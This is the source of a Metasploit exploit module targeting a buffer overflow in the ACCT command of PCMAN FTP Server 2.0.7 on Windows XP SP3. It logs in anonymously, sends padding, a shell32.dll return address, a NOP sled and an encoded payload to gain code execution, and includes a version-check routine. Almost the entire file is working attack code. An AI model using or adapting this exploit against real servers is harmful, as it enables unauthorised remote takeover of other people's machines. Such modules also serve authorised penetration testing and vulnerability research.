# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;PCMAN FTP Server Buffer Overflow - ACCT Command&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow vulnerability found in the ACCT command of the
          PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
          credientials are enabled.
      },
      &#039;Author&#039;         =>
          [
            &#039;Cybernetic&#039;,      # Initial Discovery -- https://www.exploit-db.com/exploits/40704/
            &#039;Ye Yint Min Thu Htut&#039;   # msf Module -- @yeyint_mth @yehg
          ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;,   &#039;&#039;],
          [ &#039;OSVDB&#039;,   &#039;&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;   => 1000,
          &#039;BadChars&#039;  => "\x00\x0A\x0D",
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows XP SP3 English&#039;,
            {
              &#039;Ret&#039; => 0x7E6B31C7, # shell32.dll
              &#039;Offset&#039; => 2007
            }
          ],
        ],
      &#039;DisclosureDate&#039; => &#039;Nov 03 2016&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end

  def check
    connect_login
    disconnect

    if /220 PCMan&#039;s FTP Server 2\.0/ === banner
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end


  def exploit
    connect_login

    print_status(&#039;Creating payload...&#039;)
    sploit = rand_text_alpha(target[&#039;Offset&#039;])
    sploit << [target.ret].pack(&#039;V&#039;)
    sploit << make_nops(30)
    sploit << payload.encoded

    send_cmd( ["ACCT", sploit], false )
    disconnect
  end

end

